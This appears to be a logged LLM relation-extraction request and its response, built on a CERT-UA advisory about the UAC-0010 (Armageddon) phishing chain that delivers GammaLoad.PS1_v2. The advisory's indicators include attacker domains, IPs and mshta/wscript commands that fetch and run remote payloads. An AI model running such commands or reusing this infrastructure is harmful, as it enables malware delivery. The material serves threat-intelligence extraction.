@@ -1,0 +1,188 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision relation extraction engine for cybersecurity incident reports (CERT-UA). The entities of one report have already been extracted and typed. Your only task is to state the relationships between these entities that the report supports.
+
+### ENTITIES OF THIS REPORT ###
+Each line is one entity: its name exactly as extracted, its type in square brackets, and a one-sentence description. The type "untyped" means no type has been established yet; the phrase after it is the extractor's own wording.
+- UAC-0010 (Armageddon) [Threat Actor] A Russian state-sponsored cyber espionage group primarily targeting Ukrainian government and military entities.
+- GammaLoad.PS1_v2 [Malware Family] A PowerShell-based reconnaissance and payload delivery malware used by the threat actor UAC-0010.
+- План Херсон.htm [untyped: file] A malicious HTML attachment used as an initial lure to drop an archive file.
+- Herson.rar [untyped: file] A malicious archive file containing a weaponized shortcut file.
+- План підходу та закладання вибухівки на об'єктах критичної інфростурктури Херсона.lnk [untyped: file] A malicious shortcut file designed to download and execute an HTA payload.
+- precarious.xml [untyped: file] An HTA file downloaded to create and execute secondary script components.
+- rejection.xml [untyped: file] An HTA file used in the attack chain to stage malware components.
+- desktop.txt [untyped: file] A malicious script file dropped and executed by the HTA payload.
+- user.txt [untyped: file] A malicious script file dropped and executed during the infection chain.
+- get.php [untyped: file] A malicious script serving the GammaLoad.PS1_v2 payload.
+- Витяг з наказу.htm [untyped: file] A malicious HTML attachment used in phishing campaigns targeting Ukrainian entities.
+- 768_08.05.2022.rar [untyped: file] A malicious archive dropped during the phishing campaign.
+- Витяг з наказу Генерального штабу Збройних Сил України від 08.05.2022 №768.lnk [untyped: file] A weaponized LNK file masquerading as an official Ukrainian military document.
+- sendmail.website [Domain Name] A malicious domain name used for sending phishing emails.
+- a0671524.xsph.ru [Domain Name] A domain name used as malicious infrastructure to host payloads.
+- a0667987.xsph.ru [Domain Name] A domain name used to host malicious XML and icon payloads.
+- qiwardos.ru [Domain Name] A command-and-control domain used to deliver GammaLoad malware.
+- nitikora.ru [Domain Name] A domain associated with malicious network infrastructure.
+- milotraf.ru [Domain Name] A domain identified as part of the threat actor's network infrastructure.
+- nikotod.ru [Domain Name] A domain identified as malicious network infrastructure.
+- military-ukraine@sendmail.website [Email Address] A spoofed email address used by threat actors to distribute phishing lures.
+- coyote@sendmail.website [Email Address] An email address used by threat actors to send malicious phishing messages.
+- 194.58.121.198 [IP Address] An IP address observed as part of the malicious email delivery infrastructure.
+- 92.53.116.145 [IP Address] An IP address identified in connection with malicious email transmission.
+- 216.128.131.233 [IP Address] An IP address associated with the threat actor's network infrastructure.
+- 66.42.95.123 [IP Address] An IP address associated with the malicious infrastructure.
+- icanhazip.com [Domain Name] A legitimate public IP lookup service abused by malware to discover external IP addresses.
+- Україна [Country] A country in Eastern Europe.
+
+### KNOWN RELATION TYPES ###
+Each relation type is known ONLY for the pair of argument types it is listed under (head type -> tail type). Types known for other pairs are not shown and do not apply.
+Head [(untyped)] -> Tail [(untyped)]:
+- operates-instance-of: The head entity hosts, deploys, or manages an instance or node of the software product specified as the tail.
+- has-contact-email: The head entity maintains or uses the tail email address for official communication or incident reporting.
+- subordinate-to: The head entity is an administrative unit, working body, or subdivision of the tail government body.
+- uses-malware: The head threat actor utilizes or deploys the tail malware family in their operations.
+- contains-file: The head archive or container file encloses the tail file.
+- hosted-on: The head domain, infrastructure, or resource is hosted or deployed on the tail platform or hosting service.
+- exfiltrates-data-to: The head malware transmits stolen information to the tail platform, service, or destination.
+- routes-traffic-through: The head malware routes or proxies its network communications through the tail network or proxy service.
+
+### WHAT TO OUTPUT ###
+1. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two of the entities above, as { "head", "type", "tail", "evidence", "fit" }.
+   - `head` / `tail` MUST exactly match entity names from the list above. Direction: head acts on tail.
+   - `type`: if a known relation type listed under exactly this pair of argument types states the relationship precisely, use its name. Otherwise write a short lower-case verb phrase with hyphens in your own words, as specific as the text allows. Do NOT stretch a known type to a relationship it does not precisely state, and do NOT use a type listed under a different pair of argument types.
+   - `fit`: "exact" when a known type of this pair states the relationship precisely; "loose" when you used a known type of this pair although it only roughly fits; "new" when you wrote your own phrase.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+2. `newRelationTypes`: [{ "name", "definition" }] — one entry with a one-line definition for EVERY type you wrote yourself (fit "new").
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p><strong>Загальна інформація</strong></p><p><span style="color: rgb(36, 36, 36);">Урядовою командою реагування на комп'ютерні надзвичайні події України CERT-UA отримано інформацію про факт розсилання електронних листів з темою "Щодо проведення акції помсти у Херсоні!", що містять вкладення у вигляді файлу "План Херсон.htm".</span></p><p><span style="color: rgb(36, 36, 36);">HTM-файл забезпечить декодування і створення на комп'ютері жертви файлу "Herson.rar", який містить файл-ярлик "План підходу та закладання вибухівки на об'єктах критичної інфростурктури Херсона.lnk".</span></p><p><span style="color: rgb(36, 36, 36);">Згаданий LNK-файл у разі його вікдриття забезпечить завантаження і запуск HTA-файлу "precarious.xml", що призведе до створення та виконання файлів "desktop.txt" і "user.txt".</span></p><p><span style="color: rgb(36, 36, 36);">В результаті, на комп'ютер буде завантажено шкідливу програму GammaLoad.PS1_v2 (імплементовано механізм виготовлення знімку екрану та його відправки на сервер управління).</span></p><p><span style="color: rgb(36, 36, 36);">Активність здійснюється групою UAC-0010 (Armageddon).</span></p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellcheck="false">4c434fafbdb64ee9c56a4e3007b1ef33&nbsp; &nbsp; b1bc659006938eb5912832eb8412c609d2d875c001ab411d1b69d343515291b7&nbsp; &nbsp; План Херсон.htm
+f94693b8def27e4555dc7ac6a25260d0&nbsp; &nbsp; f9b68f9a3e41bafa612bcadd6e4c5ef75870549164e50f6b7ec55d1edad90674&nbsp; &nbsp; Herson.rar
+a367898f46c7a8ce0ba6d6e9690cc4b7&nbsp; &nbsp; 94f4b54060f50523380082879ac262e67477acf5656aec3912078e1d756e9f1f&nbsp; &nbsp; План підходу та закладання вибухівки на об'єктах критичної інфростурктури Херсона.lnk
+c3ad33e72e37f2f9ee1f901a9dab3660&nbsp; &nbsp; 370da0474afb87623e070b83834472c307089533796940fb8ebbe9c8cf048c93&nbsp; &nbsp; rejection.xml
+8993c593f70cc133dc70198052517c57&nbsp; &nbsp; 95eb176f66026aef579d515a5d2563dc2310eff038c68807c433b3418699f902&nbsp; &nbsp; desktop.txt
+d9041a202ef19a778817aed83f547010&nbsp; &nbsp; 000696f213103798767ad0ea47acf60d9d475c45de4584a0e8625067c1b89ba7&nbsp; &nbsp; user.txt
+c3c41fda9f83f579f3912ca4e769b634&nbsp; &nbsp; 3a0796096af51af33a28361670e9af8a9791b04c83025c0a904a36b3d1962c2e&nbsp; &nbsp; get.php (GammaLoad.PS1_v2)
+
+
+(10.05.2022)
+fd49ac4b68e63ef4c44a08c05157b520&nbsp; &nbsp; 215d79d31ec6c4b008cf585dcf90007487b636229284b9ad924f52206c46a8a7&nbsp; &nbsp; Витяг з наказу.htm&nbsp;
+9e472931556b6f6e3c1e50d719df83f9&nbsp; &nbsp; f2f4dec274f0d7bd26c0d39e1cffc4b38b1e1919dfca6e20f754eddfa5931bbf&nbsp; &nbsp; 768_08.05.2022.rar
+76bdfe083b9038ab35757ba8cfac9a97&nbsp; &nbsp; 7a36935f624855f21c03b17b9b6e652f9b400aec79f6d1f221ef7380f2f9c02e&nbsp; &nbsp; Витяг з наказу Генерального штабу Збройних Сил України від 08.05.2022 №768.lnk
+</pre><p><br></p><p><em>Мережеві:</em></p><pre class="ql-syntax" spellcheck="false">sendmail[.]website
+a0671524.xsph[.]ru
+a0667987.xsph[.]ru
+qiwardos[.]ru
+nitikora[.]ru
+milotraf[.]ru
+nikotod[.]ru
+military-ukraine@sendmail.website
+coyote@sendmail.website
+194[.]58.121.198 (Received)
+92[.]53.116.145 (Received)
+216[.]128.131.233
+66[.]42.95.123
+hXXp://qiwardos[.]ru/get.php
+hXXp://qiwardos[.]ru/index.php
+hXXp://a0671524.xsph[.]ru/mo/faicon.ico
+hXXp://a0671524.xsph[.]ru/bandage/precarious.xml
+hXXp://a0667987.xsph[.]ru/zsu/faicon.ico
+hXXp://a0667987.xsph[.]ru/preparations/rejection.xml
+hXXps://icanhazip[.]com (Легітимний сервіс)
+</pre><p><br></p><p><em>Хостові:</em></p><pre class="ql-syntax" spellcheck="false">%WINDIR%\System32\mshta.exe http://a0671524.xsph.ru/bandage/precarious.xml /f
+%WINDIR%\System32\mshta.exe http://a0667987.xsph.ru/preparations/rejection.xml /f
+cmd.exe /c wscript.exe %USERPROFILE%\desktop.txt //b //e:VBScript
+%USERPROFILE%\desktop.txt
+</pre><p><br></p><p><strong>Графічні зображення</strong></p><p><strong>﻿</strong></p>
+
+=== RESPONSE (6.9s, in 3673 / out 1083 tok, STOP) ===
+UAC-0010 (Armageddon) conducted a cyber attack campaign deploying GammaLoad.PS1_v2 malware. The initial infection vector involved the file "План Херсон.htm" decoding and creating the archive "Herson.rar", which contains the shortcut file "План підходу та закладання вибухівки на об'єктах критичної інфростурктури Херсона.lnk". Executing the LNK file downloads and launches "precarious.xml" (hosted on a0671524.xsph.ru), which creates and executes "desktop.txt" and "user.txt", leading to the retrieval of GammaLoad.PS1_v2 from qiwardos.ru via "get.php".
+
+{
+  "relations": [
+    {
+      "head": "UAC-0010 (Armageddon)",
+      "type": "uses-malware",
+      "tail": "GammaLoad.PS1_v2",
+      "evidence": "завантажено шкідливу програму GammaLoad.PS1_v2... Активність здійснюється групою UAC-0010 (Armageddon)",
+      "fit": "exact"
+    },
+    {
+      "head": "План Херсон.htm",
+      "type": "creates",
+      "tail": "Herson.rar",
+      "evidence": "HTM-файл забезпечить декодування і створення на комп'ютері жертви файлу \"Herson.rar\"",
+      "fit": "new"
+    },
+    {
+      "head": "Herson.rar",
+      "type": "contains-file",
+      "tail": "План підходу та закладання вибухівки на об'єктах критичної інфростурктури Херсона.lnk",
+      "evidence": "\"Herson.rar\", який містить файл-ярлик \"План підходу та закладання вибухівки",
+      "fit": "exact"
+    },
+    {
+      "head": "План підходу та закладання вибухівки на об'єктах критичної інфростурктури Херсона.lnk",
+      "type": "downloads-and-executes",
+      "tail": "precarious.xml",
+      "evidence": "LNK-файл у разі його вікдриття забезпечить завантаження і запуск HTA-файлу \"precarious.xml\"",
+      "fit": "new"
+    },
+    {
+      "head": "precarious.xml",
+      "type": "creates",
+      "tail": "desktop.txt",
+      "evidence": "HTA-файлу \"precarious.xml\", що призведе до створення та виконання файлів \"desktop.txt\"",
+      "fit": "new"
+    },
+    {
+      "head": "precarious.xml",
+      "type": "creates",
+      "tail": "user.txt",
+      "evidence": "що призведе до створення та виконання файлів \"desktop.txt\" і \"user.txt\"",
+      "fit": "new"
+    },
+    {
+      "head": "a0671524.xsph.ru",
+      "type": "hosts-file",
+      "tail": "precarious.xml",
+      "evidence": "hXXp://a0671524.xsph[.]ru/bandage/precarious.xml",
+      "fit": "new"
+    },
+    {
+      "head": "a0667987.xsph.ru",
+      "type": "hosts-file",
+      "tail": "rejection.xml",
+      "evidence": "hXXp://a0667987.xsph[.]ru/preparations/rejection.xml",
+      "fit": "new"
+    },
+    {
+      "head": "qiwardos.ru",
+      "type": "hosts-file",
+      "tail": "get.php",
+      "evidence": "hXXp://qiwardos[.]ru/get.php",
+      "fit": "new"
+    }
+  ],
+  "newRelationTypes": [
+    {
+      "name": "creates",
+      "definition": "The head entity generates, extracts, drops, or writes the tail file onto the victim's filesystem."
+    },
+    {
+      "name": "downloads-and-executes",
+      "definition": "The head entity downloads the tail payload from a remote resource and initiates its execution."
+    },
+    {
+      "name": "hosts-file",
+      "definition": "The head domain or server infrastructure hosts the tail downloadable file or payload."
+    }
+  ]
+}
